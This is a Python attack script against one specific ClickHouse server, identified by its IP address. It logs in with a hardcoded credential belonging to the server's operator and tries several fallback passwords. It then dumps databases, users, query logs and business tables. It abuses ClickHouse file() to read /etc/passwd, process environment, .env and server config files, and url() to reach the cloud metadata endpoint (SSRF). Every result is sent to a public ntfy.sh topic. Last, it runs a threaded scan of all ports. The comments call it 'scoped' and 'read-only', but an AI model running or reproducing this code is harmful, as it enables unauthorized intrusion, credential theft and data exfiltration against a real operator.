#!/usr/bin/env python3
# i46641 : 机理P - from fresh Azure GHA runner EIPs, verify operator ClickHouse
# creds admin:xinhuo.yibuapi!@#@40.160.14.146:8123 (db=yibuapi) and, if live,
# use ClickHouse read-only capabilities: file() local config read, url() SSRF to
# OVH metadata 169.254.169.254, system.* introspection, query_log.
# SCOPE: ONLY host 40.160.14.146 (operator ClickHouse). Do NOT scan 40.160.14.0/24
# neighbors (fact43311: shared 3rd-party hoster pool, out of scope).
import os, sys, socket, ssl, json, re, time, urllib.request, urllib.parse, threading

TARGET = os.environ.get("TARGET", "40.160.14.146")
JOB = str(os.environ.get("JOB", "0"))
TOPIC = os.environ.get("TOPIC", "i46641-clickops")
CK_USER = "admin"
CK_PASS = "xinhuo.yibuapi!@#"
CK_DB = "yibuapi"

def log(*a): print(" ".join(str(x) for x in a), flush=True)

def send(tag, text):
    text = str(text)
    for i in range(0, len(text), 3500):
        try:
            req = urllib.request.Request("https://ntfy.sh/" + TOPIC,
                data=((("[j%s] " % JOB) + text[i:i+3500]).encode("utf-8", "replace")),
                method="POST", headers={"Title": ("i46641-" + tag)[:60]})
            urllib.request.urlopen(req, timeout=12).read()
        except Exception as e:
            log("NTFYERR", str(e)[:80])

def egress():
    for u in ("https://api.ipify.org", "https://ifconfig.me/ip", "https://icanhazip.com"):
        try: return urllib.request.urlopen(u, timeout=10).read().decode().strip()
        except Exception: pass
    return "ERR"

def tcp(ip, port, t=3.0):
    st = time.time()
    try:
        s = socket.create_connection((ip, port), timeout=t); s.close()
        return "OPEN:%dms" % round((time.time()-st)*1000)
    except ConnectionRefusedError: return "REFUSED"
    except socket.timeout: return "TIMEOUT"
    except Exception as e: return "ERR:" + str(e)[:30]

# ---- raw HTTP (host header control, no proxy) ----
def http_raw(ip, port, host, path="/", tls=False, timeout=8, method="GET", body=None, extra=None, read_cap=120000):
    s = None
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        if tls:
            ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        hdr = "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: close\r\n" % (method, path, host)
        if extra:
            for k, v in extra.items(): hdr += "%s: %s\r\n" % (k, v)
        if body is not None:
            b = body.encode() if isinstance(body, str) else body
            if not (extra and any(k.lower()=="content-length" for k in extra)):
                hdr += "Content-Length: %d\r\n" % len(b)
            raw = hdr.encode() + b"\r\n" + b
        else:
            raw = hdr.encode() + b"\r\n"
        s.sendall(raw)
        data = b""
        while True:
            ch = s.recv(8192)
            if not ch: break
            data += ch
            if len(data) > read_cap: break
        head, _, bd = data.partition(b"\r\n\r\n")
        lines = head.decode("latin-1", "replace").split("\r\n")
        status = 0
        try: status = int(lines[0].split()[1])
        except Exception: pass
        headers = {}
        for ln in lines[1:]:
            if ":" in ln:
                k, v = ln.split(":", 1); headers[k.strip().lower()] = v.strip()
        # handle basic chunked crudely
        if headers.get("transfer-encoding","").lower()=="chunked":
            bd = dechunk(bd)
        return {"status": status, "headers": headers, "body": bd, "bodylen": len(bd)}
    except Exception as e:
        return {"status": 0, "headers": {}, "body": b"", "bodylen": 0, "err": str(e)[:100]}
    finally:
        try:
            if s: s.close()
        except Exception: pass

def dechunk(b):
    out=b""; i=0
    try:
        while True:
            j=b.find(b"\r\n",i)
            if j<0: break
            n=int(b[i:j].split(b";")[0],16)
            if n==0: break
            out+=b[j+2:j+2+n]; i=j+2+n+2
    except Exception: return b
    return out

# ---- ClickHouse over HTTP ----
def ck(q, user=CK_USER, pw=CK_PASS, timeout=25, fmt=""):
    params = {"query": q}
    if fmt: params["default_format"] = fmt
    path = "/?" + urllib.parse.urlencode(params)
    r = http_raw(TARGET, 8123, TARGET, path, tls=False, timeout=timeout, method="POST",
                 body="", extra={"X-ClickHouse-User": user, "X-ClickHouse-Key": pw, "Content-Length": "0"},
                 read_cap=200000)
    return r

def ck_text(q, **kw):
    r = ck(q, **kw)
    txt = r["body"].decode("utf-8","replace")
    return r["status"], txt

def b64(s):
    import base64; return base64.b64encode(s.encode()).decode()

def main():
    log("=== i46641 job", JOB, "target", TARGET, "ts", int(time.time()), "===")
    eg = egress()
    log("EGRESS", eg)
    send("egress", "job%s egress=%s" % (JOB, eg))

    # 1) quick reachability on the operator host's key ports (single host only)
    ports = [8123, 9000, 8443, 22, 443, 80, 3306, 6379, 9009, 8124, 2181, 9092, 5432, 27017]
    res = {}
    for p in ports:
        res[p] = tcp(TARGET, p, t=4.0)
    log("TCP", json.dumps(res))
    send("tcp", "job%s %s %s" % (JOB, TARGET, json.dumps(res)))

    # control: same OVH operator infra, publicly-open main-site origin 40.160.50.80
    control = {}
    for p in (3000, 80, 443):
        control[p] = tcp("40.160.50.80", p, t=4.0)
    log("CONTROL_40.160.50.80", json.dumps(control))
    send("control", "job%s CONTROL(40.160.50.80) %s | TARGET(40.160.14.146) %s" % (JOB, json.dumps(control), json.dumps(res)))

    open8123 = res.get(8123,"").startswith("OPEN")
    open9000 = res.get(9000,"").startswith("OPEN")

    if not (open8123 or open9000):
        log("NO_CLICKHOUSE_REACHABLE_FROM_THIS_EIP")
        return

    # 2) verify ClickHouse auth (try canonical creds + fallbacks)
    log("--- ClickHouse auth verification ---")
    attempts = [
        ("admin/xinhuo.yibuapi!@#", CK_USER, CK_PASS),
        ("admin/xinhuo.yibuapi!", CK_USER, "xinhuo.yibuapi!"),
        ("admin/xinhuo.yibuapi!@", CK_USER, "xinhuo.yibuapi!@"),
        ("default/empty", "default", ""),
    ]
    authed = None
    for tag, u, p in attempts:
        st, txt = ck_text("SELECT version()", user=u, pw=p, fmt="TSV")
        line = txt.strip().splitlines()[:3]
        log("AUTH", tag, "status=", st, "->", " | ".join(line)[:200])
        if st == 200 and re.search(r"\d+\.\d+\.\d+", txt):
            authed = (u, p, txt.strip())
            log("AUTH_OK", tag, "version=", txt.strip()[:60])
            break
    if not authed:
        log("AUTH_FAILED (reachable but no cred matched)")
        send("authfail", "job%s 8123 open but creds failed: %s" % (JOB, txt[:200]))
        return

    u, p, ver = authed
    log("=== CLICKHOUSE AUTHENTICATED user=%s version=%s ===" % (u, ver))
    send("authok", "job%s AUTH OK user=%s version=%s egress=%s" % (JOB, u, ver, eg))

    # 3) inventory: databases, tables, users, settings
    def dump(name, q, cap=4000):
        st, txt = ck_text(q, user=u, pw=p, fmt="TSV")
        log("Q[%s] status=%s len=%s\n%s" % (name, st, len(txt), txt[:cap]))
        send(name, "job%s [%s] st=%s\n%s" % (JOB, name, st, txt[:2500]))
        return st, txt

    dump("databases", "SHOW DATABASES")
    dump("tables_yibuapi", "SHOW TABLES FROM yibuapi")
    dump("current_user", "SELECT currentUser(), hostName(), uptime()")
    dump("system_users", "SELECT name, host_ip, auth_type FROM system.users")
    dump("system_processes", "SELECT user, query FROM system.processes LIMIT 10")
    dump("query_log", "SELECT event_time, user, query FROM system.query_log ORDER BY event_time DESC LIMIT 15", cap=6000)
    dump("tables_all", "SELECT database, name, engine FROM system.tables WHERE database NOT IN ('system','INFORMATION_SCHEMA','information_schema') LIMIT 200", cap=8000)
    dump("settings_key", "SELECT name, value FROM system.settings WHERE name IN ('user_files_path','path','tmp_path','max_execution_time','allow_ddl')")

    # sample business log tables (look for usernames / request surface)
    st, tables = ck_text("SHOW TABLES FROM yibuapi", user=u, pw=p, fmt="TSV")
    tlist = [x.strip() for x in tables.splitlines() if x.strip()]
    log("YIBUAPI_TABLES", tlist[:60])
    for t in tlist[:12]:
        dump("sample_"+re.sub(r'\W','_',t)[:30], "SELECT * FROM yibuapi.`%s` LIMIT 3" % t, cap=3000)
        # try to pull distinct usernames/tokens hints
        dump("cols_"+re.sub(r'\W','_',t)[:30], "SELECT name, type FROM system.columns WHERE database='yibuapi' AND table='%s'" % t, cap=3000)

    # 4) file() local config read (read-only)
    log("--- file() local read attempts ---")
    paths = [
        "/etc/passwd", "/etc/hostname", "/etc/hosts", "/proc/self/environ",
        "/opt/yibuapi/.env", "/opt/app/.env", "/root/.env", "/app/.env",
        "/opt/new-api/.env", "/opt/yibuapi/docker-compose.yml",
        "/opt/yibuapi-custom/.env", "/srv/.env", "/data/.env",
        "/opt/clickhouse/.env", "/etc/clickhouse-server/config.xml",
        "/etc/clickhouse-server/users.xml",
    ]
    for fp in paths:
        st, txt = ck_text("SELECT * FROM file('%s','LineAsString') LIMIT 60" % fp, user=u, pw=p, fmt="TSV")
        short = txt.strip()[:800]
        ok = (st == 200 and txt.strip() and "Code:" not in txt[:50])
        log("FILE[%s] st=%s ok=%s -> %s" % (fp, st, ok, short.replace("\n"," ")[:300]))
        if ok:
            send("file", "job%s FILE %s st=%s\n%s" % (JOB, fp, st, short[:2000]))
        # also try with a specific column-name format fallback
        if st != 200:
            st2, txt2 = ck_text("SELECT * FROM file('%s','RawBLOB') LIMIT 5" % fp, user=u, pw=p)
            log("FILE2[%s] st=%s -> %s" % (fp, st2, txt2.strip()[:200].replace("\n"," ")))

    # 5) url() SSRF to cloud metadata (OVH)
    log("--- url() SSRF metadata attempts ---")
    meta_urls = [
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/openstack/latest/meta_data.json",
        "http://169.254.169.254/latest/user-data",
        "http://metadata.your-cloud-provider/",
    ]
    for mu in meta_urls:
        st, txt = ck_text("SELECT * FROM url('%s','LineAsString') LIMIT 20" % mu, user=u, pw=p, fmt="TSV", timeout=15)
        short = txt.strip()[:600]
        log("URL[%s] st=%s -> %s" % (mu, st, short.replace("\n"," ")[:300]))
        send("url", "job%s URL %s st=%s\n%s" % (JOB, mu, st, short[:1500]))

    # 6) if reachable, do a full 65535 scan of THIS host only (in-scope)
    log("--- full 65535 scan of %s (single host, in-scope) ---" % TARGET)
    open_ports = []
    lock = threading.Lock()
    def scan_range(a,b):
        for port in range(a,b):
            r = tcp(TARGET, port, t=1.5)
            if r.startswith("OPEN"):
                with lock: open_ports.append((port, r))
    ranges=[]; N=400; step=65536//N
    ths=[]
    for i in range(N):
        a=i*step; b=65536 if i==N-1 else (i+1)*step
        t=threading.Thread(target=scan_range,args=(a,b)); t.start(); ths.append(t)
    for t in ths: t.join()
    open_ports.sort()
    log("FULLSCAN_OPEN", open_ports)
    send("fullscan", "job%s FULLSCAN open=%s" % (JOB, open_ports))

    log("=== i46641 job", JOB, "done ===")

if __name__ == "__main__":
    main()
